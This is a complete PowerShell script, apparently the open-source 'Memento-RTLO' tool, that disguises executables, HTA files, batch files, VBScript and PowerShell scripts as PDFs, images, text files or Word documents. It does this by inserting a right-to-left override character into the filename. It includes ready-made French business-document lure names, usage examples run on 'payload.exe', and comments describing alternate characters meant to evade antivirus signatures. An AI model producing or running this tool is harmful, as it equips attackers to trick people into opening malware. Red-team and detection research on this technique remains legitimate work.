<#
.SYNOPSIS
Right-to-Left Override (RTLO) extension spoofing file renamer.

.DESCRIPTION
Memento-RTLO renames or copies executable files so that their displayed
extension appears benign while the underlying filesystem entry and
operating-system behavior remain unchanged.

The tool inserts the Unicode Right-to-Left Override control character
(U+202E) into the filename at a calculated position. The Unicode
Bidirectional Algorithm (UAX #9) then causes every subsequent character
to be rendered in reverse visual order.

Supported real extensions : .exe  .hta  .bat  .vbs  .ps1
Supported spoof extensions : pdf  jpeg  jpg  png  txt  csv  eml  docx

.PARAMETER --file
Path to the executable file to spoof. Required for renaming operations.

.PARAMETER --choice
Global index of the spoof pattern to apply (see --show-list).
If omitted, an interactive menu is displayed for the file's extension.

.PARAMETER --replace
When specified, the original file is renamed in-place.
Default: a copy is created alongside the original.

.PARAMETER --dry-run
Preview the output filename without creating any file.

.PARAMETER --show-list
Print every available pattern with its global index, then exit.
When combined with --file, only patterns for that extension are shown.

.PARAMETER --bidi-char
Bidirectional control character to use for the override.
  rlo  U+202E  RIGHT-TO-LEFT OVERRIDE   (default; only char that produces visual spoof in Explorer)
  rli  U+2067  RIGHT-TO-LEFT ISOLATE    (Unicode 6.3; different byte signature; no visual reversal)
  rle  U+202B  RIGHT-TO-LEFT EMBEDDING  (legacy; different byte signature; no visual reversal)
Note: only rlo (U+202E) produces the extension masking visible in Explorer. rli and rle are
useful for research/AV signature comparison but do not achieve the same social-engineering effect.

.PARAMETER --help / /help / -help
Display usage information and exit.

.EXAMPLE
PS C:\> .\MementoRTLO.ps1 --show-list
Lists all patterns with their global index.

.EXAMPLE
PS C:\> .\MementoRTLO.ps1 --file payload.exe --choice 3
Copies payload.exe with the 3rd pattern matching .exe.

.EXAMPLE
PS C:\> .\MementoRTLO.ps1 --file payload.exe --choice 3 --dry-run
Previews the filename without writing anything.

.EXAMPLE
PS C:\> .\MementoRTLO.ps1 --file payload.bat --replace
Interactive selection, renames in place.

.NOTES
Author  : Franck FERMAN
Version : 2.2.0
License : GNU AGPLv3
GitHub  : https://github.com/franckferman/Memento-RTLO

MITRE ATT&CK : T1036.002 (Masquerading: Right-to-Left Override)
#>

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

# ---------------------------------------------------------------------------
# Bidirectional character map - resolved after arg parsing via --bidi-char.
# Default: U+202E (RLO). Alternatives provide different byte signatures to
# evade AV signatures that target the U+202E byte sequence (e.g. Artoelo.B).
# ---------------------------------------------------------------------------
$BidiCharMap = @{
    'rlo' = [char]0x202E   # RIGHT-TO-LEFT OVERRIDE   - UTF-16LE: 2E 20
    'rli' = [char]0x2067   # RIGHT-TO-LEFT ISOLATE    - UTF-16LE: 67 20 (Unicode 6.3)
    'rle' = [char]0x202B   # RIGHT-TO-LEFT EMBEDDING  - UTF-16LE: 2B 20
}
$RTLO = $BidiCharMap['rlo']  # placeholder - overwritten after arg parsing

# ---------------------------------------------------------------------------
# Association table.
# Ordered to guarantee stable display and consistent --choice indices.
# Each extension maps to an array of hashtables {Name, Extension}.
# ---------------------------------------------------------------------------
$Associations = [ordered]@{
    '.exe' = @(
        [ordered]@{ Name = 'Rapport_Q4_2024';    Extension = 'pdf'  }
        [ordered]@{ Name = 'Annexe_contrat';      Extension = 'pdf'  }
        [ordered]@{ Name = 'Devis_client';        Extension = 'pdf'  }
        [ordered]@{ Name = 'Photo_reunion';       Extension = 'jpeg' }
        [ordered]@{ Name = 'Scan_document';       Extension = 'jpg'  }
        [ordered]@{ Name = 'Logo_societe';        Extension = 'png'  }
        [ordered]@{ Name = 'Note_interne';        Extension = 'txt'  }
    )
    '.hta' = @(
        [ordered]@{ Name = 'Info_reunion';        Extension = 'jpg'  }
        [ordered]@{ Name = 'Bilan_annuel';        Extension = 'pdf'  }
        [ordered]@{ Name = 'Fichier_partage';     Extension = 'txt'  }
        [ordered]@{ Name = 'Capture_ecran';       Extension = 'png'  }
    )
    '.bat' = @(
        [ordered]@{ Name = 'Liste_contacts';      Extension = 'csv'  }
        [ordered]@{ Name = 'Note_reunion';        Extension = 'txt'  }
        [ordered]@{ Name = 'Instructions_setup';  Extension = 'txt'  }
        [ordered]@{ Name = 'Export_donnees';      Extension = 'csv'  }
    )
    '.vbs' = @(
        [ordered]@{ Name = 'Script_backup';       Extension = 'txt'  }
        [ordered]@{ Name = 'Email_client';        Extension = 'eml'  }
        [ordered]@{ Name = 'Rapport_audit';       Extension = 'pdf'  }
    )
    '.ps1' = @(
        [ordered]@{ Name = 'Config_systeme';      Extension = 'txt'  }
        [ordered]@{ Name = 'Rapport_securite';    Extension = 'pdf'  }
        [ordered]@{ Name = 'Donnees_export';      Extension = 'csv'  }
        [ordered]@{ Name = 'Document_interne';    Extension = 'docx' }
    )
}

# ---------------------------------------------------------------------------
# Build the flat global list used for --show-list and --choice resolution.
# Returns array of [pscustomobject] with: GlobalIndex, RealExt, Name, FakeExt
# ---------------------------------------------------------------------------
function Get-GlobalList {
    $list = [System.Collections.Generic.List[pscustomobject]]::new()
    $idx = 1
    foreach ($ext in $Associations.Keys) {
        foreach ($item in $Associations[$ext]) {
            $list.Add([pscustomobject]@{
                GlobalIndex = $idx
                RealExt     = $ext
                Name        = $item.Name
                FakeExt     = $item.Extension
            })
            $idx++
        }
    }
    return $list
}

# ---------------------------------------------------------------------------
# Reverse a string using character array slice.
# ---------------------------------------------------------------------------
function Reverse-String([string]$s) {
    if ($s.Length -le 1) { return $s }
    return -join $s.ToCharArray()[-1..-($s.Length)]
}

# ---------------------------------------------------------------------------
# Build the RTLO filename from a pattern entry and the real extension.
#
# Logical layout:  <Name> + U+202E + reverse(<FakeExt>) + <RealExt>
#
# Example: Name="Annexe", FakeExt="jpeg", RealExt=".exe"
#   Logical bytes:  A n n e x e [U+202E] g e p j . e x e
#   Bidi rendering: Annexe exe.jpeg
#   Explorer shows extension column: jpeg
# ---------------------------------------------------------------------------
function Build-Filename([pscustomobject]$entry, [string]$realExt) {
    $revFake = Reverse-String $entry.FakeExt
    return "$($entry.Name)$RTLO$revFake$realExt"
}

# ---------------------------------------------------------------------------
# Show-Banner
# ---------------------------------------------------------------------------
function Show-Banner {
    Write-Host "====================================================" -ForegroundColor Cyan
    Write-Host "  Memento-RTLO  -  File Extension Spoofing Tool" -ForegroundColor Cyan
    Write-Host "  MITRE ATT&CK T1036.002  |  Author: Franck FERMAN" -ForegroundColor Cyan
    Write-Host "====================================================" -ForegroundColor Cyan
}

# ---------------------------------------------------------------------------
# Show-Help
# ---------------------------------------------------------------------------
function Show-Help {
    Show-Banner
    Write-Host ""
    Write-Host "Usage:" -ForegroundColor Yellow
    Write-Host "  .\MementoRTLO.ps1 --file <path> [--choice <N>] [--replace] [--dry-run]"
    Write-Host "  .\MementoRTLO.ps1 --show-list [--file <path>]"
    Write-Host ""
    Write-Host "Options:" -ForegroundColor Yellow
    Write-Host "  --file <path>          Source file to spoof (.exe/.hta/.bat/.vbs/.ps1)"
    Write-Host "  --choice <N>           Global pattern index from --show-list"
    Write-Host "  --replace              Rename in-place (default: create a copy)"
    Write-Host "  --dry-run              Preview output filename, no file written"
    Write-Host "  --show-list            List all available patterns with global indices"
    Write-Host "  --bidi-char <mode>     Bidi override character: rlo (default) | rli | rle"
    Write-Host "                           rlo = U+202E RLO - visual spoof works in Explorer (Artoelo.B)"
    Write-Host "                           rli = U+2067 RLI - different byte signature; no visual spoof"
    Write-Host "                           rle = U+202B RLE - different byte signature; no visual spoof"
    Write-Host "  --help / /help         Show this help"
    Write-Host ""
    Write-Host "Examples:" -ForegroundColor Yellow
    Write-Host "  .\MementoRTLO.ps1 --show-list"
    Write-Host "  .\MementoRTLO.ps1 --file payload.exe --choice 3"
    Write-Host "  .\MementoRTLO.ps1 --file payload.exe --choice 3 --dry-run"
    Write-Host "  .\MementoRTLO.ps1 --file payload.bat --replace"
    Write-Host "  .\MementoRTLO.ps1 --file payload.exe --choice 1 --bidi-char rli"
    Write-Host ""
    exit 0
}

# ---------------------------------------------------------------------------
# Show-List  [optional: filter by extension]
# ---------------------------------------------------------------------------
function Show-List([string]$filterExt = '') {
    $list = Get-GlobalList
    $prevExt = ''
    foreach ($entry in $list) {
        if ($filterExt -and $entry.RealExt -ne $filterExt) { continue }
        if ($entry.RealExt -ne $prevExt) {
            Write-Host ""
            Write-Host "  [$($entry.RealExt)]" -ForegroundColor Yellow
            $prevExt = $entry.RealExt
        }
        Write-Host ("  [{0,2}]  {1}.{2}" -f $entry.GlobalIndex, $entry.Name, $entry.FakeExt)
    }
    Write-Host ""
    exit 0
}

# ---------------------------------------------------------------------------
# Argument parsing
# ---------------------------------------------------------------------------
$Params = [ordered]@{
    File     = $null
    Choice   = $null      # $null = not provided; 0 is invalid, caught later
    Replace  = $false
    DryRun   = $false
    ShowList = $false
    BidiChar = 'rlo'      # rlo (default) | rli | rle
}

$i = 0
while ($i -lt $args.Count) {
    switch -regex ($args[$i]) {
        '^(/help|--help|-help)$' { Show-Help }
        '^--file$'      { $i++; $Params.File = $args[$i] }
        '^--choice$'    { $i++; $Params.Choice = [int]$args[$i] }
        '^--replace$'   { $Params.Replace = $true }
        '^--dry-run$'   { $Params.DryRun = $true }
        '^--show-list$' { $Params.ShowList = $true }
        '^--bidi-char$' {
            $i++
            $bc = $args[$i].ToLower()
            if ($bc -notin @('rlo','rli','rle')) {
                Write-Host "Error: --bidi-char must be rlo, rli, or rle." -ForegroundColor Red
                exit 1
            }
            $Params.BidiChar = $bc
        }
        default {
            Write-Host "Unknown argument: $($args[$i])" -ForegroundColor Yellow
        }
    }
    $i++
}

# ---------------------------------------------------------------------------
# Resolve the bidi character from --bidi-char (default: rlo = U+202E)
# ---------------------------------------------------------------------------
$RTLO = $BidiCharMap[$Params.BidiChar]

# ---------------------------------------------------------------------------
# Handle --show-list (with optional --file filter)
# ---------------------------------------------------------------------------
if ($Params.ShowList) {
    Show-Banner
    $filterExt = ''
    if ($Params.File) {
        $filterExt = [System.IO.Path]::GetExtension($Params.File).ToLower()
    }
    Write-Host ""
    Write-Host "Available patterns (use global index with --choice):" -ForegroundColor White
    Show-List $filterExt
}

# ---------------------------------------------------------------------------
# Input validation
# ---------------------------------------------------------------------------
if (-not $Params.File) {
    Write-Host "Error: --file is required." -ForegroundColor Red
    Write-Host "Run with --help for usage." -ForegroundColor Gray
    exit 1
}

if (-not (Test-Path $Params.File)) {
    Write-Host "Error: File not found: $($Params.File)" -ForegroundColor Red
    exit 1
}

$FileExt = [System.IO.Path]::GetExtension($Params.File).ToLower()
if ($Associations.Keys -notcontains $FileExt) {
    $supported = ($Associations.Keys) -join ', '
    Write-Host "Error: Unsupported extension '$FileExt'." -ForegroundColor Red
    Write-Host "Supported: $supported" -ForegroundColor Gray
    exit 1
}

# ---------------------------------------------------------------------------
# Pattern selection
# --choice N  -> look up in the GLOBAL list; validate it matches $FileExt
# (no --choice) -> interactive menu limited to the current extension's pairs
# ---------------------------------------------------------------------------
$GlobalList = Get-GlobalList
$Selected   = $null

if ($null -ne $Params.Choice) {
    # Resolve from global list
    $match = $GlobalList | Where-Object { $_.GlobalIndex -eq $Params.Choice }
    if (-not $match) {
        $max = ($GlobalList | Measure-Object -Property GlobalIndex -Maximum).Maximum
        Write-Host "Error: --choice $($Params.Choice) is out of range (1-$max)." -ForegroundColor Red
        Write-Host "Run --show-list to see available patterns." -ForegroundColor Gray
        exit 1
    }
    if ($match.RealExt -ne $FileExt) {
        Write-Host "Error: Pattern $($Params.Choice) is for '$($match.RealExt)' files, but '$($Params.File)' is '$FileExt'." -ForegroundColor Red
        Write-Host "Run --show-list --file '$($Params.File)' to see compatible patterns." -ForegroundColor Gray
        exit 1
    }
    $Selected = $match
} else {
    # Interactive: show only patterns for this extension
    $extPatterns = $GlobalList | Where-Object { $_.RealExt -eq $FileExt }
    Write-Host ""
    Write-Host "Select spoof pattern for $FileExt files:" -ForegroundColor Yellow
    foreach ($entry in $extPatterns) {
        Write-Host ("  [{0,2}]  {1}.{2}" -f $entry.GlobalIndex, $entry.Name, $entry.FakeExt)
    }
    Write-Host ""
    $input = Read-Host "Enter global index"
    $chosen = $null
    if (-not [int]::TryParse($input, [ref]$chosen)) {
        Write-Host "Error: Not a valid number." -ForegroundColor Red
        exit 1
    }
    $match = $extPatterns | Where-Object { $_.GlobalIndex -eq $chosen }
    if (-not $match) {
        Write-Host "Error: Index $chosen is not valid for $FileExt. Use one of the listed numbers." -ForegroundColor Red
        exit 1
    }
    $Selected = $match
}

# ---------------------------------------------------------------------------
# Build the spoofed filename
# ---------------------------------------------------------------------------
$NewFileName = Build-Filename $Selected $FileExt
$SourceDir   = (Get-Item $Params.File).DirectoryName
$NewPath     = [System.IO.Path]::Combine($SourceDir, $NewFileName)

$BidiLabel = @{ 'rlo' = 'U+202E RLO'; 'rli' = 'U+2067 RLI'; 'rle' = 'U+202B RLE' }[$Params.BidiChar]
Show-Banner
Write-Host ""
Write-Host "  Source    : $($Params.File)" -ForegroundColor White
Write-Host "  Pattern   : [$($Selected.GlobalIndex)] $($Selected.Name).$($Selected.FakeExt)  (for $FileExt)" -ForegroundColor White
Write-Host "  Bidi char : $BidiLabel" -ForegroundColor White
Write-Host "  Output    : $NewFileName" -ForegroundColor Green
Write-Host ""

# ---------------------------------------------------------------------------
# File operation (skip if --dry-run)
# ---------------------------------------------------------------------------
if ($Params.DryRun) {
    Write-Host "[DRY RUN] No file written." -ForegroundColor Yellow
} elseif ($Params.Replace) {
    Rename-Item -Path $Params.File -NewName $NewFileName
    Write-Host "[OK] File renamed in-place." -ForegroundColor Green
} else {
    Copy-Item -Path $Params.File -Destination $NewPath
    Write-Host "[OK] Spoofed copy created." -ForegroundColor Green
}
Write-Host ""
